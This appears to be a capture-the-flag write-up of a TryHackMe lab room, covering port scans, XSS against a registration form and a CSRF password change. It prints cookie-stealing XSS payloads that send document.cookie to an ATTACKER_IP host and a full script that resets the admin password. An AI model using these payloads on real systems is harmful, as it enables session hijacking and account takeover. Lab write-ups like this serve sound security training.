@@ -1,0 +1,201 @@
+This article will talk about how to solve a medium level “What’s Your Name” room on #TryHackMe. Besides that, I’ll add quick tips for preventing the vulnerabilities I discovered at the end.
+
+Press enter or click to view image in full size
+
+Room requirements:
+
+Before starting to solve the room, I added the IP address of the target to the /etc/hosts as worldwap.thm.
+
+Room also has 2 questions:
+
+Press enter or click to view image in full size
+
+1. Enumeration
+As usual, the initial step was scanning open ports of the target.
+
+Press enter or click to view image in full size
+
+3 ports were open — 22, 80, 8081.
+
+Press enter or click to view image in full size
+
+I targeted port 80 and fuzzed for disclosing hidden directories and files on port 80.
+
+Press enter or click to view image in full size
+
+I also fuzzed public directory:
+
+Press enter or click to view image in full size
+
+Continued from fuzzing /public/html:
+
+Press enter or click to view image in full size
+
+Lastly, fuzzed /api directory:
+
+Press enter or click to view image in full size
+
+The website has a login page:
+
+Press enter or click to view image in full size
+
+The website forwards me to login.worldwap.thm. Here, I also tried to fuzz directories and files:
+
+Press enter or click to view image in full size
+
+Lastly, I fuzzed hidden directories and files on port 8081.
+
+Press enter or click to view image in full size
+
+2. Moderator access via XSS:
+The website has a register page, so I gave a shot.
+
+Press enter or click to view image in full size
+
+Press enter or click to view image in full size
+
+Press enter or click to view image in full size
+
+But returned the following error. Page said that I have to visit the domain named login.worldwap.thm.
+
+Press enter or click to view image in full size
+
+Press enter or click to view image in full size
+
+The same error returned by the website.
+
+At this point, I tried everything, checked page sources, registered several times, searched for valid credentials. But I was missing a hint, the creator left a message for me on the register page.
+
+Press enter or click to view image in full size
+
+The message said, “Your details will be reviewed by the site moderator.”. It means, I have 2 options:
+
+1. I have to find a way to make the moderator review the account that I registered.
+
+2. I have to find a way to get access as a moderator.
+
+Unfortunately, the first one wasn’t a good idea, because I didn’t know how the review flow was working on the website. I have to follow the first option.
+
+To gain access as a moderator, I decided to steal the moderator’s cookie, why? Because when I checked the cookie of my current session, I saw the value of the HttpOnly flag is false. This means, it was possible to steal the moderator’s cookie via XSS, if inputs in the register page was vulnerable.
+
+Press enter or click to view image in full size
+
+For getting moderator’s cookie, I used script tag with window.location method.
+
+PAYLOAD: <script>window.location=’http://ATTACKER_IP:PORT/?’+document.cookie;</script>
+
+Or you can use img iframe HTML tags with event handlers like onerror, onbeforescriptexecute, etc.
+
+I tried with both img and script tags.
+
+First, started listener on port 4444, where the website have to send the GET request with cookie.
+
+
+Adding the payload in Email input:
+
+Press enter or click to view image in full size
+
+Press enter or click to view image in full size
+
+And I got the cookie.
+
+Another example with img tag:
+
+
+Added the payload to the name input:
+
+<img src=x onerror=”window.location=’http://ATTACKER_IP:PORT/?’+document.cookie;” />
+
+Press enter or click to view image in full size
+
+Press enter or click to view image in full size
+
+Again, I got the result.
+
+On this page, username and password inputs weren’t worked for me because of input size limitations.
+
+After getting the cookie, I went to the login.worldwap.thm page, because of the message on the register page.
+
+Press enter or click to view image in full size
+
+After swapping the cookie, I refreshed the page.
+
+Press enter or click to view image in full size
+
+And here was the moderator profile, also I got the answer of the room’s first question.
+
+3. Getting admin bot’s cookie
+After getting access to the moderator account, I surfed between the tabs to find out a way to log in as an admin.
+
+Actually, it has 2 ways:
+
+3.1. Changing admin’s password via CSRF
+Press enter or click to view image in full size
+
+On the chat page, I found a vulnerable Stored XSS input.
+
+Press enter or click to view image in full size
+
+Again, I thought it was possible to get the admin’s token, but it didn’t work for me.
+
+Press enter or click to view image in full size
+
+Press enter or click to view image in full size
+
+Again, I checked the pages and found changepassword feature.
+
+Press enter or click to view image in full size
+
+I tried to change the password, but the website gave me a message that it was only available for admin.
+
+After some time, I remembered a section from the CSRFv2 room. It was talking about getting access as a victim by making a victim change its password via CSRF.
+
+CSRF
+Learn how a CSRF vulnerability works and methods to exploit and defend against CSRF vulnerabilities.
+tryhackme.com
+
+I copied the payload and made some modifications.
+
+<script>
+var xhr = new XMLHttpRequest();
+xhr.open('POST', atob('aHR0cDovL2xvZ2luLndvcmxkd2FwLnRobS9jaGFuZ2VfcGFzc3dvcmQucGhw'), true);
+xhr.setRequestHeader("X-Requested-With", "XMLHttpRequest");
+xhr.setRequestHeader('Content-Type', 'application/x-www-form-urlencoded');
+xhr.onreadystatechange = function () {
+if (xhr.readyState === XMLHttpRequest.DONE && xhr.status === 200) {
+alert("Action executed!");
+}
+};
+xhr.send('action=execute&new_password=admin123');
+</script>
+Basically, this script made a POST request to the base64 encoded URL I added below and adds admin123 to the new_password input. If the response was 200 OK, then alert will be displayed in the page.
+
+http://login.worldwap.thm/change_password.php
+
+Then, I pasted it to the chat message bar, and fortunately, it worked.
+
+Press enter or click to view image in full size
+
+Press enter or click to view image in full size
+
+Password was changed, and it was time to log in as an admin.
+
+Press enter or click to view image in full size
+
+Press enter or click to view image in full size
+
+Here I got access as an admin, and the answer of the second question of the room.
+
+3.2. Read admin.py under login.worldwap.thm
+Because of the chatbot I found on the login.worldwap.thm, I thought maybe fuzzing with py extension could be a great way to find out how chat page was working.
+
+Press enter or click to view image in full size
+
+Of course, I got admin.py and test.py. I read both and found hardcoded credentials.
+
+Press enter or click to view image in full size
+
+Press enter or click to view image in full size
+
+Press enter or click to view image in full size
+
